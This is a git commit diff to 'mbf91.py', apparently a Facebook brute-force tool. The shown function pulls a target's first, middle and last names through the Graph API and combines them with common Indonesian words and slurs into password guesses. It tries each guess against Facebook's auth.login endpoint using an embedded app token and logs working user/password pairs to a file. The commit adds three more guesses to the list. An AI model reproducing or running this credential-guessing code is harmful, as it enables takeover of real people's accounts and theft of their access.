0a4f2abaf3c1a182b514163fdb6308c262331e94
L4.ERROR <56863313+KmB-new@users.noreply.github.com>
2019-12-29 20:09:37 +0700

    Update mbf91.py

--- mbf91.py
+++ mbf91.py
@@ -288,7 +288,7 @@ def x(user):
 		fn = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
 		mn = s.get(url.format(user+"?access_token=%s"%(toket))).json()["middle_name"]
 		ln = s.get(url.format(user+"?access_token=%s"%(toket))).json()["last_name"]
-		for pas in [fn+"123",fn+'12345',mn+'123',mn+'12345',ln+"123",ln+"12345","Sayang","Sayang2","Sayangku","Anjing","Bangsat","Bajingan","Bandung","Bacot","Bacot123","Cintaku","Cintaku1","Cinta123","Doraemon","Indonesia","Jakarta","Kontol123","Memek123","Surabaya","Lamongan","Sayang12345","qwertyuiop","1234567890","Master123"]:
+		for pas in [fn+"123",fn+'12345',mn+'123',mn+'12345',ln+"123",ln+"12345","Sayang","Sayang2","Sayangku","Anjing","Bangsat","Bajingan","Bandung","Bacot","Bacot123","Cintaku","Cintaku1","Cinta123","Doraemon","Indonesia","Jakarta","Kontol123","Memek123","Surabaya","Lamongan","Sayang12345","qwertyuiop","1234567890","Master123","Tolol123","Goblok","Selingku"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("hasil/ok.txt","a").write("%s | %s\n"%(user,pas))
